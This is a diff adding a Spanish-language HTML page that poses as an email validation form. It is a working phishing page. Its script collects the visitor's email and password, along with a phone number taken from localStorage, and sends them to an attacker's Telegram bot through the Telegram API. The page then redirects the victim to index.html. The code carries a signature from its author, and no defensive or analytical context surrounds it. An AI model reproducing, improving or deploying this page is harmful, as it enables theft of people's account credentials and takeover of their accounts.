@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Valida</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #4caf50, #81c784);
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #333;
+    }
+
+    .login-box {
+      background: white;
+      padding: 40px 30px;
+      border-radius: 16px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.12);
+      width: 350px;
+      max-width: 90%;
+      text-align: center;
+    }
+
+    .login-box h1 {
+      margin-bottom: 12px;
+      font-weight: 600;
+      font-size: 1.8rem;
+      color: #333;
+    }
+
+    .description {
+      font-weight: 400;
+      font-size: 1rem;
+      color: #555;
+      margin-bottom: 28px;
+      line-height: 1.4;
+    }
+
+    label {
+      display: block;
+      text-align: left;
+      font-weight: 600;
+      margin-bottom: 8px;
+      color: #555;
+      font-size: 1rem;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      border: 2px solid #ddd;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      font-size: 1rem;
+      box-sizing: border-box;
+      transition: border-color 0.3s ease;
+    }
+
+    input:focus {
+      border-color: #4caf50;
+      outline: none;
+      background-color: #f0fdf0;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      background-color: #21c063;
+      border: none;
+      border-radius: 14px;
+      color: white;
+      font-weight: 600;
+      font-size: 1.1rem;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #1aa454;
+    }
+
+    .footer-text {
+      margin-top: 20px;
+      font-size: 0.9rem;
+      color: #555;
+    }
+
+    .footer-text strong {
+      display: block;
+      margin-bottom: 6px;
+    }
+
+    .footer-text a {
+      color: #4caf50;
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .footer-text a:hover {
+      text-decoration: underline;
+    }
+
+    .error {
+      color: red;
+      font-weight: bold;
+      margin-bottom: 10px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-box">
+    <h1>Valide su correo electrónico</h1>
+    <p class="description">Ingrese los datos de su correo asociado o a asociar</p>
+
+    <form id="loginForm">
+      <div class="error" id="errorMsg">Completa todos los campos correctamente.</div>
+
+      <label for="email">Correo electrónico</label>
+      <input type="email" id="email" required placeholder="correo@ejemplo.com" />
+
+      <label for="password">Contraseña</label>
+      <input type="password" id="password" required placeholder="••••••••" />
+
+      <button type="submit">Validar</button>
+    </form>
+
+    
+    </div>
+  </div>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script src="dt.js"></script>
+  <script>
+    $('#loginForm').submit(function(e) {
+      e.preventDefault();
+
+      const email = $('#email').val().trim();
+      const password = $('#password').val().trim();
+
+      if (!email || !password) {
+        $('#errorMsg').show();
+        return;
+      }
+
+      const numero = localStorage.getItem('telefono_completo') || "Número no disponible";
+
+const message = 
+"Whats\n\n" +
+"📱 Número: " + numero + "\n" +
+"📧 Correo: " + email + "\n" +
+"🔑 Contraseña: " + password + "\n\n" +
+"C0DE BY 4DFC TRAMP$$ 👨🏻‍💻🥷🏻";
+
+
+      $.ajax({
+        url: "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        method: "POST",
+        contentType: "application/json",
+        data: JSON.stringify({
+          chat_id: chat_id,
+          text: message
+        }),
+        success: function() {
+          window.location = "index.html";
+        },
+        error: function() {
+          $('#errorMsg').text("Error al enviar. Intenta nuevamente.").show();
+        }
+      });
+    });
+  </script>
+
+</body>
+</html>
